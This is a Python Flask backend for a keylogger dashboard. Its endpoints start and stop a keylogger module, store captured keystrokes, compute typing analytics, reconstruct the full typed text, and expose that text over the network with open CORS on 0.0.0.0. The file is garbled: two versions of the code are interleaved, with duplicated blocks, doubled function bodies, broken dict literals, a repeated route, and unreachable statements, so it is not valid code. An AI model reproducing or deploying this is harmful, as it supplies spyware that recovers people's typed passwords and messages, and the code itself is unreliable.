"""
╔══════════════════════════════════════════════════════════════════╗
║         FLASK API SERVER — KeyLogger Dashboard Backend           ║
╚══════════════════════════════════════════════════════════════════╝
Flask API Server — KeyLogger Dashboard Backend
Run:  python server.py
API available at http://localhost:5000
"""
import os
import re
import sys
import json
import time
import threading
from datetime import datetime
from collections import Counter
from flask import Flask, jsonify, request, send_from_directory
from flask_cors import CORS
# ─── Import keylogger module ─────────────────────────────────────
import sys
# ─── Fix Windows console encoding ────────────────────────────────
if sys.stdout.encoding and sys.stdout.encoding.lower() != "utf-8":
    sys.stdout.reconfigure(encoding="utf-8", errors="replace")
# ─── Import keylogger module ──────────────────────────────────────
sys.path.insert(0, os.path.dirname(os.path.abspath(__file__)))
from keylogger import start_keylogger, get_session_data, session_data, lock
# ─── Paths ───────────────────────────────────────────────────────
BASE_DIR  = os.path.dirname(os.path.dirname(os.path.abspath(__file__)))
LOG_DIR   = os.path.join(BASE_DIR, "logs")
JSON_FILE = os.path.join(LOG_DIR, "keystrokes.json")
# ─── Paths ────────────────────────────────────────────────────────
BASE_DIR   = os.path.dirname(os.path.dirname(os.path.abspath(__file__)))
LOG_DIR    = os.path.join(BASE_DIR, "logs")
JSON_FILE  = os.path.join(LOG_DIR, "keystrokes.json")
TEXT_FILE  = os.path.join(LOG_DIR, "keystrokes.log")
STATE_FILE = os.path.join(LOG_DIR, "state.json")
FRONTEND  = os.path.join(BASE_DIR, "frontend")
SESSIONS_FILE = os.path.join(LOG_DIR, "sessions.json")
FRONTEND   = os.path.join(BASE_DIR, "frontend")
# ─── App setup ───────────────────────────────────────────────────
os.makedirs(LOG_DIR, exist_ok=True)
# ─── App setup ────────────────────────────────────────────────────
app = Flask(__name__, static_folder=FRONTEND)
CORS(app)
keylogger_thread = None
# ─── Server start time ────────────────────────────────────────────
SERVER_START = datetime.now().isoformat()
# ══════════════════════════════════════════════════════════════════
#  Utility helpers
# ══════════════════════════════════════════════════════════════════
def load_json_log():
    """Load all keystroke records from the JSON log file."""
    if not os.path.exists(JSON_FILE):
        return []
    try:
        with open(JSON_FILE, "r", encoding="utf-8") as f:
            return json.load(f)
    except (json.JSONDecodeError, ValueError):
            data = json.load(f)
            return data if isinstance(data, list) else []
    except (json.JSONDecodeError, ValueError, OSError):
        return []
def load_text_log():
    """Load plain text log lines."""
    log_file = os.path.join(LOG_DIR, "keystrokes.log")
    if not os.path.exists(log_file):
    if not os.path.exists(TEXT_FILE):
        return []
    with open(log_file, "r", encoding="utf-8") as f:
        return [line.rstrip() for line in f.readlines() if line.strip()]
    try:
        with open(TEXT_FILE, "r", encoding="utf-8") as f:
            return [line.rstrip() for line in f if line.strip()]
    except OSError:
        return []
def compute_analytics(records):
    """Compute all analytics from a list of keystroke records."""
    total   = len(records)
    special = sum(1 for r in records if r.get("type") == "special")
    regular = total - special
    backspaces = sum(1 for r in records if r.get("is_backspace"))
    # Key frequency
    freq = Counter(r.get("display", r.get("key", "?")) for r in records)
    top_keys = [{"key": k, "count": c} for k, c in freq.most_common(20)]
    # Per-hour breakdown
    hour_counts = {str(h).zfill(2): 0 for h in range(24)}
    for r in records:
        try:
            hour = r["timestamp"].split(" ")[1].split(":")[0]
            if hour in hour_counts:
                hour_counts[hour] += 1
        except (KeyError, IndexError):
            pass
    hourly = [{"hour": f"{h}:00", "count": c} for h, c in hour_counts.items()]
    # Bigrams (most common 2-key sequences of regular keys)
    reg_keys = [r.get("key", "") for r in records
                if r.get("type") == "regular" and len(r.get("key", "")) == 1]
    bigrams = Counter(reg_keys[i] + reg_keys[i+1] for i in range(len(reg_keys) - 1))
    top_bigrams = [{"bigram": b, "count": c} for b, c in bigrams.most_common(10)]
    # Accuracy estimate
    accuracy = round((1 - backspaces / max(regular, 1)) * 100, 2)
    accuracy = max(0.0, min(100.0, accuracy))
    # Words-per-minute estimate (rough: spaces / elapsed minutes)
    spaces = freq.get(" ", freq.get("[SPACE]", 0))
    timestamps = [r["timestamp"] for r in records if "timestamp" in r]
    elapsed_min = 1.0
    if len(timestamps) >= 2:
        try:
            fmt = "%Y-%m-%d %H:%M:%S.%f"
            t0 = datetime.strptime(timestamps[0][:23],  fmt[:17])
            t1 = datetime.strptime(timestamps[-1][:23], fmt[:17])
            elapsed_min = max(1.0, (t1 - t0).total_seconds() / 60)
        except Exception:
            pass
    wpm = round(spaces / elapsed_min, 1) if elapsed_min > 0 else 0
    return {
        "total_keystrokes":   total,
        "regular_keys":       regular,
        "special_keys":       special,
        "backspaces":         backspaces,
        "accuracy_estimate":  accuracy,
        "wpm_estimate":       wpm,
        "top_keys":           top_keys,
        "top_bigrams":        top_bigrams,
        "hourly_distribution": hourly,
        "unique_keys":        len(freq),
        "session_start":      timestamps[0] if timestamps else None,
        "session_end":        timestamps[-1] if timestamps else None,
    }
def load_sessions():
    """Load saved session history."""
    if not os.path.exists(SESSIONS_FILE):
        return []
    try:
        with open(SESSIONS_FILE, "r", encoding="utf-8") as f:
            return json.load(f)
    except (json.JSONDecodeError, OSError):
        return []
def save_session_snapshot():
    """Save a snapshot of the current session to session history."""
    records = load_json_log()
    if not records:
        return
    stats = compute_analytics(records)
    sessions = load_sessions()
    snapshot = {
        "session_id":     session_data.get("session_id"),
        "saved_at":       datetime.now().isoformat(),
        "total":          stats["total_keystrokes"],
        "regular":        stats["regular_keys"],
        "special":        stats["special_keys"],
        "accuracy":       stats["accuracy_estimate"],
        "wpm":            stats["wpm_estimate"],
        "session_start":  stats["session_start"],
        "session_end":    stats["session_end"],
    }
    # Avoid duplicate session IDs
    sessions = [s for s in sessions if s.get("session_id") != snapshot["session_id"]]
    sessions.append(snapshot)
    sessions = sessions[-50:]   # keep last 50 sessions
    with open(SESSIONS_FILE, "w", encoding="utf-8") as f:
        json.dump(sessions, f, indent=2)
# ══════════════════════════════════════════════════════════════════
#  Serve Frontend Pages
#  Serve Frontend
# ══════════════════════════════════════════════════════════════════
@app.route("/")
def serve_index():
    return send_from_directory(FRONTEND, "index.html")
@app.route("/<path:filename>")
def serve_static(filename):
    return send_from_directory(FRONTEND, filename)
# ══════════════════════════════════════════════════════════════════
#  API Routes
#  API — Health & Info
# ══════════════════════════════════════════════════════════════════
@app.route("/api/health", methods=["GET"])
def api_health():
    """Simple health check endpoint."""
    return jsonify({
        "status": "ok",
        "server_time": datetime.now().isoformat(),
        "server_start": SERVER_START,
        "uptime_seconds": round((datetime.now() - datetime.fromisoformat(SERVER_START)).total_seconds()),
        "log_dir": LOG_DIR,
        "json_log_exists": os.path.exists(JSON_FILE),
        "text_log_exists": os.path.exists(TEXT_FILE),
    })
# ══════════════════════════════════════════════════════════════════
#  API — Session Status
# ══════════════════════════════════════════════════════════════════
@app.route("/api/status", methods=["GET"])
def api_status():
    """Return current keylogger session status."""
    data = get_session_data()
    records = load_json_log()
    return jsonify({
        "is_running": data.get("is_running", False),
        "session_id": data.get("session_id"),
        "start_time": data.get("start_time"),
        "is_running":       data.get("is_running", False),
        "session_id":       data.get("session_id"),
        "start_time":       data.get("start_time"),
        "total_keystrokes": data.get("total_keystrokes", 0),
        "regular_keys": data.get("regular_keys", 0),
        "special_keys": data.get("special_keys", 0),
        "backspaces": data.get("backspaces", 0),
        "server_time": datetime.now().isoformat()
        "regular_keys":     data.get("regular_keys", 0),
        "special_keys":     data.get("special_keys", 0),
        "backspaces":       data.get("backspaces", 0),
        "total_logged":     len(records),
        "server_time":      datetime.now().isoformat(),
    })
# ══════════════════════════════════════════════════════════════════
#  API — Keylogger Controls
# ══════════════════════════════════════════════════════════════════
@app.route("/api/start", methods=["POST"])
def api_start():
    """Start the keylogger in a background thread."""
    """Start the keylogger in a background daemon thread."""
    global keylogger_thread
    if session_data.get("is_running"):
        return jsonify({"status": "already_running", "message": "Keylogger is already active."}), 400
        return jsonify({"status": "already_running",
                        "message": "Keylogger is already active."}), 400
    keylogger_thread = threading.Thread(target=start_keylogger, daemon=True)
    keylogger_thread.start()
    return jsonify({"status": "started", "message": "Keylogger started successfully."})
    return jsonify({"status": "started",
                    "message": "Keylogger started successfully.",
                    "session_id": session_data.get("session_id")})
@app.route("/api/stop", methods=["POST"])
def api_stop():
    """Mark the session as stopped (listener stops on ESC, or via this flag)."""
    """Send stop signal and snapshot the session."""
    with lock:
        session_data["is_running"] = False
    return jsonify({"status": "stopped", "message": "Keylogger stop signal sent."})
    save_session_snapshot()
    return jsonify({"status": "stopped",
                    "message": "Keylogger stopped. Session snapshot saved.",
                    "total_keystrokes": session_data.get("total_keystrokes", 0)})
# ══════════════════════════════════════════════════════════════════
#  API — Live Feed
# ══════════════════════════════════════════════════════════════════
@app.route("/api/live", methods=["GET"])
def api_live():
    """Return the last N keystrokes from in-memory buffer."""
    n = min(int(request.args.get("n", 30)), 500)
    data = get_session_data()
    keystrokes = data.get("keystrokes", [])
    return jsonify({
        "keystrokes": keystrokes[-n:],
        "total":      data.get("total_keystrokes", 0),
        "is_running": data.get("is_running", False),
        "session_id": data.get("session_id"),
    })
# ══════════════════════════════════════════════════════════════════
#  API — Keystroke Log (paginated)
# ══════════════════════════════════════════════════════════════════
@app.route("/api/keystrokes", methods=["GET"])
def api_keystrokes():
    """Return paginated keystrokes from the JSON log."""
    page  = int(request.args.get("page", 1))
    limit = int(request.args.get("limit", 50))
    key_type = request.args.get("type", None)  # 'regular' | 'special'
    try:
        page     = max(1, int(request.args.get("page", 1)))
        limit    = min(max(1, int(request.args.get("limit", 50))), 500)
        key_type = request.args.get("type", None)
        search   = request.args.get("q", "").lower().strip()
    except ValueError:
        return jsonify({"error": "Invalid query parameters"}), 400
    records = load_json_log()
    if key_type:
    if key_type in ("regular", "special"):
        records = [r for r in records if r.get("type") == key_type]
    if search:
        records = [r for r in records
                   if search in r.get("display", "").lower()
                   or search in r.get("key", "").lower()]
    total = len(records)
    start = (page - 1) * limit
    end   = start + limit
    paged = records[start:end]
    paged = records[start: start + limit]
    return jsonify({
        "total": total,
        "page": page,
        "limit": limit,
        "keystrokes": paged
        "total":      total,
        "page":       page,
        "limit":      limit,
        "pages":      max(1, -(-total // limit)),   # ceiling division
        "keystrokes": paged,
    })
@app.route("/api/live", methods=["GET"])
def api_live():
    """Return the last N keystrokes from memory for the live feed."""
    n = int(request.args.get("n", 30))
    data = get_session_data()
    keystrokes = data.get("keystrokes", [])
    return jsonify({
        "keystrokes": keystrokes[-n:],
        "total": data.get("total_keystrokes", 0),
        "is_running": data.get("is_running", False)
    })
# ══════════════════════════════════════════════════════════════════
#  API — Analytics  (FIXED: returns 200 even when empty)
# ══════════════════════════════════════════════════════════════════
@app.route("/api/analytics", methods=["GET"])
def api_analytics():
    """Return computed analytics over the full log."""
    """Return computed analytics. Returns empty payload (not 404) when no data."""
    records = load_json_log()
    if not records:
        return jsonify({"error": "No data available"}), 404
        # Return a valid empty payload so the frontend doesn't break
        return jsonify({
            "total_keystrokes":    0,
            "regular_keys":        0,
            "special_keys":        0,
            "backspaces":          0,
            "accuracy_estimate":   0.0,
            "wpm_estimate":        0.0,
            "unique_keys":         0,
            "top_keys":            [],
            "top_bigrams":         [],
            "hourly_distribution": [{"hour": f"{h:02d}:00", "count": 0} for h in range(24)],
            "session_start":       None,
            "session_end":         None,
            "message":             "No keystroke data yet. Start the logger and begin typing.",
        })
    # Key frequency
    freq = {}
    for r in records:
        key = r.get("display", r.get("key", "?"))
        freq[key] = freq.get(key, 0) + 1
    return jsonify(compute_analytics(records))
    top_keys = sorted(freq.items(), key=lambda x: x[1], reverse=True)[:20]
    # Per-hour breakdown
    hour_counts = {str(h).zfill(2): 0 for h in range(24)}
# ══════════════════════════════════════════════════════════════════
#  API — Word / Phrase reconstruction
# ══════════════════════════════════════════════════════════════════
@app.route("/api/reconstruct", methods=["GET"])
def api_reconstruct():
    """
    Reconstruct typed text from the keystroke log.
    Handles backspaces, Shift, Enter, Space, Tab.
    """
    records = load_json_log()
    if not records:
        return jsonify({"text": "", "word_count": 0, "char_count": 0,
                        "message": "No data to reconstruct."})
    buf = []
    shift_held = False
    for r in records:
        try:
            hour = r["timestamp"].split(" ")[1].split(":")[0]
            hour_counts[hour] = hour_counts.get(hour, 0) + 1
        except (KeyError, IndexError):
            pass
        key  = r.get("key", "")
        disp = r.get("display", key)
        ktype = r.get("type", "regular")
    total = len(records)
    special = sum(1 for r in records if r.get("type") == "special")
    regular = total - special
        if ktype == "special":
            ku = key.upper()
            if "BACKSPACE" in ku:
                if buf:
                    buf.pop()
            elif "SPACE" in ku:
                buf.append(" ")
            elif "ENTER" in ku or "RETURN" in ku:
                buf.append("\n")
            elif "TAB" in ku:
                buf.append("\t")
            elif "SHIFT" in ku:
                shift_held = True
            else:
                shift_held = False
        else:
            char = key if len(key) == 1 else disp
            if shift_held and char.isalpha():
                char = char.upper()
            buf.append(char)
            shift_held = False
    text = "".join(buf)
    words = [w for w in re.split(r"\s+", text) if w]
    return jsonify({
        "total_keystrokes": total,
        "regular_keys": regular,
        "special_keys": special,
        "top_keys": [{"key": k, "count": c} for k, c in top_keys],
        "hourly_distribution": [{"hour": h, "count": c} for h, c in hour_counts.items()]
        "text":       text,
        "word_count": len(words),
        "char_count": len(text.replace("\n", "").replace("\t", "")),
        "line_count": text.count("\n") + 1,
        "preview":    text[:500] + ("..." if len(text) > 500 else ""),
    })
# ══════════════════════════════════════════════════════════════════
#  API — Session History
# ══════════════════════════════════════════════════════════════════
@app.route("/api/sessions", methods=["GET"])
def api_sessions():
    """Return history of all saved sessions."""
    sessions = load_sessions()
    return jsonify({
        "total":    len(sessions),
        "sessions": list(reversed(sessions)),   # newest first
    })
@app.route("/api/sessions/snapshot", methods=["POST"])
def api_snapshot():
    """Manually save a session snapshot."""
    save_session_snapshot()
    return jsonify({"status": "ok", "message": "Session snapshot saved."})
# ══════════════════════════════════════════════════════════════════
#  API — Log Export & Management
# ══════════════════════════════════════════════════════════════════
@app.route("/api/logs/text", methods=["GET"])
def api_logs_text():
    """Return plain text log lines."""
    lines = load_text_log()
    return jsonify({"lines": lines, "total": len(lines)})
@app.route("/api/logs/export", methods=["GET"])
def api_logs_export():
    """Export all keystrokes as JSON."""
    """Export all keystrokes as a JSON array."""
    records = load_json_log()
    return jsonify(records)
@app.route("/api/logs/stats", methods=["GET"])
def api_log_stats():
    """Return file sizes and record counts."""
    def fsize(path):
        try:
            return os.path.getsize(path)
        except OSError:
            return 0
    records = load_json_log()
    lines   = load_text_log()
    return jsonify({
        "json_records":    len(records),
        "text_lines":      len(lines),
        "json_size_bytes": fsize(JSON_FILE),
        "text_size_bytes": fsize(TEXT_FILE),
        "log_dir":         LOG_DIR,
    })
@app.route("/api/clear", methods=["DELETE"])
def api_clear():
    """Clear all log files and reset session counters."""
    for fname in [JSON_FILE, os.path.join(LOG_DIR, "keystrokes.log")]:
        if os.path.exists(fname):
            os.remove(fname)
    # Save snapshot before clearing
    save_session_snapshot()
    for fpath in [JSON_FILE, TEXT_FILE]:
        if os.path.exists(fpath):
            os.remove(fpath)
    with lock:
        session_data["total_keystrokes"] = 0
        session_data["regular_keys"] = 0
        session_data["special_keys"] = 0
        session_data["backspaces"] = 0
        session_data["keystrokes"] = []
    return jsonify({"status": "cleared", "message": "All logs cleared."})
        session_data["regular_keys"]     = 0
        session_data["special_keys"]     = 0
        session_data["backspaces"]       = 0
        session_data["keystrokes"]       = []
    return jsonify({"status": "cleared",
                    "message": "All logs cleared. Session snapshot preserved."})
# ══════════════════════════════════════════════════════════════════
#  Main
#  API — Demo Data (seed for testing without real keylogger)
# ══════════════════════════════════════════════════════════════════
@app.route("/api/demo/seed", methods=["POST"])
def api_demo_seed():
    """
    Inject demo keystroke data so you can test the dashboard
    without physically running the keylogger.
    """
    import random, string
    sample_text = (
        "the quick brown fox jumps over the lazy dog "
        "hello world python flask cybersecurity keylogger "
        "dashboard analytics monitor reports export "
        "abcdefghijklmnopqrstuvwxyz 0123456789 "
    )
    special_pool = [
        "SPACE", "ENTER", "BACKSPACE", "CTRL_L", "SHIFT",
        "TAB", "DELETE", "ALT", "CAPS_LOCK"
    ]
    records = []
    base_ts = datetime.now()
    for i, ch in enumerate(sample_text * 3):
        ts = base_ts.replace(
            second=(i * 2) % 60,
            microsecond=random.randint(0, 999999)
        )
        # Occasionally inject a special key
        if random.random() < 0.08:
            sp = random.choice(special_pool)
            records.append({
                "timestamp":  ts.strftime("%Y-%m-%d %H:%M:%S.%f")[:-3],
                "key":        sp,
                "display":    f"[{sp}]",
                "type":       "special",
                "is_backspace": sp == "BACKSPACE",
                "session_id": session_data.get("session_id", "demo"),
            })
        if ch.strip() or ch == " ":
            records.append({
                "timestamp":  ts.strftime("%Y-%m-%d %H:%M:%S.%f")[:-3],
                "key":        ch,
                "display":    ch,
                "type":       "regular",
                "is_backspace": False,
                "session_id": session_data.get("session_id", "demo"),
            })
    # Write to JSON log
    existing = load_json_log()
    all_records = existing + records
    with open(JSON_FILE, "w", encoding="utf-8") as f:
        json.dump(all_records, f, indent=2)
    # Write to text log
    with open(TEXT_FILE, "a", encoding="utf-8") as f:
        for r in records:
            f.write(f"[{r['timestamp']}] {r['display']}\n")
    # Update in-memory counters
    with lock:
        session_data["total_keystrokes"] += len(records)
        session_data["regular_keys"]     += sum(1 for r in records if r["type"] == "regular")
        session_data["special_keys"]     += sum(1 for r in records if r["type"] == "special")
        session_data["backspaces"]       += sum(1 for r in records if r["is_backspace"])
        session_data["keystrokes"].extend(records[-100:])
    return jsonify({
        "status":   "seeded",
        "injected": len(records),
        "total":    len(all_records),
        "message":  f"Injected {len(records)} demo keystrokes. Refresh the dashboard!",
    })
@app.route("/api/demo/clear", methods=["DELETE"])
def api_demo_clear():
    """Remove only demo-seeded data (session_id == 'demo')."""
    records = load_json_log()
    real    = [r for r in records if r.get("session_id") != "demo"]
    with open(JSON_FILE, "w", encoding="utf-8") as f:
        json.dump(real, f, indent=2)
    return jsonify({"status": "ok", "removed": len(records) - len(real),
                    "remaining": len(real)})
# ══════════════════════════════════════════════════════════════════
#  Error handlers
# ══════════════════════════════════════════════════════════════════
@app.errorhandler(404)
def not_found(e):
    return jsonify({"error": "Endpoint not found", "path": request.path}), 404
@app.errorhandler(500)
def server_error(e):
    return jsonify({"error": "Internal server error", "detail": str(e)}), 500
@app.errorhandler(405)
def method_not_allowed(e):
    return jsonify({"error": "Method not allowed"}), 405
# ══════════════════════════════════════════════════════════════════
#  API Route Index
# ══════════════════════════════════════════════════════════════════
@app.route("/api", methods=["GET"])
def api_index():
    """Return a map of all available API endpoints."""
    return jsonify({
        "version": "2.0",
        "server_time": datetime.now().isoformat(),
        "endpoints": {
            "GET  /api/health":             "Server health & uptime",
            "GET  /api/status":             "Session status & live counters",
            "POST /api/start":              "Start keylogger",
            "POST /api/stop":               "Stop keylogger & save snapshot",
            "GET  /api/live":               "Last N keystrokes from memory (n=30)",
            "GET  /api/keystrokes":         "Paginated log (page, limit, type, q)",
            "GET  /api/analytics":          "Full analytics — always returns 200",
            "GET  /api/reconstruct":        "Reconstruct typed text from log",
            "GET  /api/sessions":           "Saved session history",
            "POST /api/sessions/snapshot":  "Save manual session snapshot",
            "GET  /api/logs/text":          "Plain text log lines",
            "GET  /api/logs/export":        "Full JSON export",
            "GET  /api/logs/stats":         "Log file sizes & record counts",
            "DEL  /api/clear":              "Clear logs (saves snapshot first)",
            "POST /api/demo/seed":          "Inject demo data for testing",
            "DEL  /api/demo/clear":         "Remove demo data",
        }
    })
# ══════════════════════════════════════════════════════════════════
#  Main Entry Point
# ══════════════════════════════════════════════════════════════════
if __name__ == "__main__":
    import sys
    # Force UTF-8 output on Windows to avoid cp1252 encoding errors
    if sys.stdout.encoding != "utf-8":
        sys.stdout.reconfigure(encoding="utf-8", errors="replace")
    print("=" * 66)
    print("  KeyLogger Dashboard Server")
    print("  KeyLogger Dashboard Server  v2.0")
    print("  Running on http://localhost:5000")
    print("  API: /api/status | /api/keystrokes | /api/analytics")
    print("  API index: http://localhost:5000/api")
    print("  Demo seed: POST http://localhost:5000/api/demo/seed")
    print("=" * 66)
    app.run(host="0.0.0.0", port=5000, debug=False)
    app.run(host="0.0.0.0", port=5000, debug=False, threaded=True)

